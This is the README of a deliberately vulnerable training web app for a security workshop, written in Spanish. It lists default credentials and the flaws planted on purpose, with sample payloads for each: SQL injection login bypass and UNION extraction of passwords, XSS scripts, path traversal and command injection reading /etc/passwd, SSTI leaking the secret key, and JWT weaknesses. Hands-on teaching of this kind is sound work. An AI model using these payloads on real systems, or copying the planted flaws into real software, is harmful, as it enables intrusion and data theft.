# TechCorp Portal - HackConRD 2026 Web Security Workshop

Bienvenido al repositorio oficial del taller de Seguridad Web en **HackConRD 2026**.

Esta es una aplicación de práctica diseñada específicamente con fines educativos. El objetivo principal es proporcionar un entorno controlado para aprender a detectar, analizar y explotar vulnerabilidades críticas en aplicaciones modernas.

---

## Inicio Rapido

### Con Docker (Recomendado)

```bash
# Clonar el repositorio
git clone https://github.com/your-repo/hackconrd-web-workshop.git
cd hackconrd-web-workshop

# Construir e iniciar
docker-compose up --build

# Acceder en: http://localhost:8080
```

### Sin Docker

```bash
# Crear entorno virtual
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# o: venv\Scripts\activate  # Windows

# Instalar dependencias
pip install -r requirements.txt

# Inicializar base de datos
python scripts/init_db.py

# Ejecutar aplicacion
python run.py

# Acceder en: http://localhost:5000
```

---

## Credenciales por Defecto

| Usuario | Contrasena | Rol |
|---------|------------|-----|
| `admin` | `admin123` | Administrador |
| `jsmith` | `password123` | Empleado |
| `test` | `test` | Pruebas |

---

## Objetivos del Taller

El laboratorio esta estructurado para cubrir los vectores de ataque mas comunes del OWASP Top 10:

| # | Vulnerabilidad | Ubicacion | Dificultad |
|---|----------------|-----------|------------|
| 1 | **SQL Injection** | Login, Employee Search | Media |
| 2 | **Cross-Site Scripting (XSS)** | Announcements | Facil |
| 3 | **IDOR** | Employee Profiles/Payslips | Facil |
| 4 | **Directory Traversal** | Document Downloads | Media |
| 5 | **Command Injection** | Network Tools | Media |
| 6 | **SSTI** | Report Generator | Dificil |
| 7 | **JWT Vulnerabilities** | API Endpoints | Dificil |

---

## Estructura del Proyecto

```
hackconrd-web-workshop/
├── app/
│   ├── __init__.py          # Flask app factory
│   ├── config.py            # Configuracion
│   ├── models.py            # Modelos de base de datos
│   ├── auth.py              # Utilidades JWT
│   ├── routes/              # Endpoints de la aplicacion
│   │   ├── auth.py          # Login/Logout (SQLi)
│   │   ├── employees.py     # Directorio (SQLi, IDOR)
│   │   ├── announcements.py # Anuncios (XSS)
│   │   ├── documents.py     # Documentos (Dir Traversal)
│   │   ├── tools.py         # Herramientas IT (Cmd Injection)
│   │   ├── reports.py       # Reportes (SSTI)
│   │   └── api.py           # API REST (JWT vulns)
│   ├── templates/           # Plantillas HTML
│   └── static/              # CSS, JS
├── data/
│   ├── documents/           # Archivos descargables
│   └── portal.db            # Base de datos SQLite
├── scripts/
│   └── init_db.py           # Script de inicializacion
├── Dockerfile
├── docker-compose.yml
└── requirements.txt
```

---

## Sistema de Dificultad

La aplicacion incluye tres niveles de dificultad que controlan la cantidad de pistas:

| Nivel | Descripcion |
|-------|-------------|
| **Easy** | Pistas en HTML, mensajes de error verbosos, payloads sugeridos |
| **Medium** | Pistas sutiles en comentarios, algunos errores |
| **Hard** | Sin pistas, errores genericos, comportamiento realista |

Cambiar dificultad: Click en el menu de dificultad en la barra de navegacion.

---

## Guia de Vulnerabilidades

### 1. SQL Injection (SQLi)

**Ubicacion:** `/auth/login`, `/employees/search`

**Payloads de ejemplo:**
```
# Login bypass
Username: admin'--
Username: ' OR '1'='1

# Union-based (Search)
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--
' UNION SELECT id,username,password,role,null,null,null,null,null,null,null FROM users--
```

### 2. Cross-Site Scripting (XSS)

**Ubicacion:** `/announcements/new`, `/announcements/search`

**Payloads:**
```html
<!-- Stored XSS -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

<!-- DOM-based (en URL) -->
?message=<script>alert('XSS')</script>
```

### 3. IDOR (Insecure Direct Object Reference)

**Ubicacion:** `/employees/<id>`, `/employees/<id>/payslip`

**Explotacion:**
- Acceder a `/employees/1/payslip`, `/employees/2/payslip`, etc.
- No hay verificacion de autorizacion

### 4. Directory Traversal

**Ubicacion:** `/documents/download?file=`

**Payloads:**
```
../../../etc/passwd
....//....//....//etc/passwd
../app/config.py
../../../flag.txt
```

### 5. Command Injection

**Ubicacion:** `/tools/ping`, `/tools/nslookup`

**Payloads:**
```
127.0.0.1; whoami
google.com | cat /etc/passwd
`id`
$(cat /etc/passwd)
127.0.0.1 && ls -la /
```

### 6. Server-Side Template Injection (SSTI)

**Ubicacion:** `/reports/generate`

**Payloads:**
```jinja2
{{ 7*7 }}
{{ config }}
{{ config.SECRET_KEY }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### 7. JWT Vulnerabilities

**Ubicacion:** `/api/auth/token`, `/api/*`

**Vulnerabilidades:**
- Clave secreta debil: `jwt-secret-key`
- Algoritmo `none` aceptado
- Sin verificacion de expiracion

---

## API Endpoints

| Endpoint | Metodo | Descripcion |
|----------|--------|-------------|
| `/api/auth/token` | POST | Obtener JWT token |
| `/api/employees` | GET | Listar empleados |
| `/api/employees/<id>` | GET | Detalles de empleado |
| `/api/tools/ping` | POST | Ping via API |
| `/api/debug` | GET | Informacion sensible |

**Ejemplo de uso:**
```bash
# Obtener token
curl -X POST http://localhost:8080/api/auth/token \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Usar token
curl http://localhost:8080/api/employees \
  -H "Authorization: Bearer <TOKEN>"
```

---

## Herramientas Requeridas

| Herramienta | Proposito |
|-------------|-----------|
| **Burp Suite Community** | Intercepcion y manipulacion de trafico HTTP |
| **ffuf** | Fuzzing de directorios y parametros |
| **cURL** | Peticiones HTTP desde terminal |
| **sqlmap** | Automatizacion de SQL Injection |
| **jwt_tool** | Analisis y explotacion de JWT |

---

## Comandos Utiles

```bash
# Reiniciar la base de datos
docker-compose down
rm -f data/portal.db
docker-compose up --build

# Ver logs
docker-compose logs -f

# Acceder al contenedor
docker exec -it techcorp-portal /bin/bash

# Detener
docker-compose down
```

---

## Aviso de Etica y Uso

> **ADVERTENCIA:** Este entorno ha sido creado **exclusivamente con fines academicos**.
>
> El uso de las tecnicas aqui descritas sobre sistemas reales sin autorizacion previa es **ilegal y poco etico**.
>
> El objetivo es formar mejores profesionales para defender y construir aplicaciones mas seguras.

---

**Organizado por:** HackConRD 2026
**Facilitador:** Nelson Colon / Bry Mano Negra

---

## Licencia

Este proyecto es solo para fines educativos. Uselo responsablemente.
